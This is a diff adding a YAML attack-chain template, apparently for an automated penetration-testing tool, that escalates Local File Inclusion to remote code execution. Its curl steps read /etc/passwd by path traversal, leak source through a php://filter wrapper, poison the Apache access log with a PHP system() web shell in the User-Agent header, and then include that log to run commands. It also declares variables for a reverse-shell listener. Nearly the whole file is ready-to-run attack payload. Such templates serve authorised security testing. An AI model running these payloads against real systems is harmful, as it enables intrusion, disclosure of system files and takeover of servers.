@@ -1,0 +1,74 @@
+name: "LFI to RCE Chain"
+description: "Detect Local File Inclusion, read sensitive files, then escalate to Remote Code Execution via log poisoning or PHP wrapper abuse."
+category: web
+attack_vector: "LFI → file disclosure → log poisoning/RCE"
+variables:
+  url:
+    required: true
+    description: "Target URL with LFI parameter (e.g. http://host/page.php?file=)"
+  lhost:
+    required: true
+    description: "Attacker listener IP for reverse shell"
+  lport:
+    required: false
+    default: 4444
+    description: "Attacker listener port"
+cutting_edge: true
+references: ["OWASP File Inclusion", "LFI to RCE via log poisoning"]
+
+steps:
+  - name: "lfi_detect"
+    tool: "curl_request"
+    description: "Test for LFI with /etc/passwd traversal"
+    args:
+      url: "{{url}}../../../../etc/passwd"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "root:|/bin/bash|passwd"
+    timeout: 60
+    gate: true
+    retries: 1
+    extracts:
+      - var: "root_line"
+        regex: "(root:[^\\n]+)"
+
+  - name: "wrapper_rce_probe"
+    tool: "curl_request"
+    description: "Probe PHP wrapper payloads (data://, php://filter) for RCE or source disclosure"
+    args:
+      url: "{{url}}php://filter/convert.base64-encode/resource=index"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "base64|[A-Za-z0-9+/=]{50,}"
+    timeout: 60
+    gate: false
+    retries: 1
+
+  - name: "log_poison_payload"
+    tool: "curl_request"
+    description: "Inject PHP payload into access log via User-Agent (log poisoning)"
+    args:
+      url: "{{url}}"
+      method: "GET"
+      headers: "User-Agent: <?php system($_GET['c']); ?>"
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 0
+
+  - name: "trigger_rce"
+    tool: "curl_request"
+    description: "Trigger the poisoned log to execute the command (id)"
+    args:
+      url: "{{url}}../../../../var/log/apache2/access.log&c=id"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: "uid=|www-data|root"
+    timeout: 60
+    gate: false
+    retries: 0
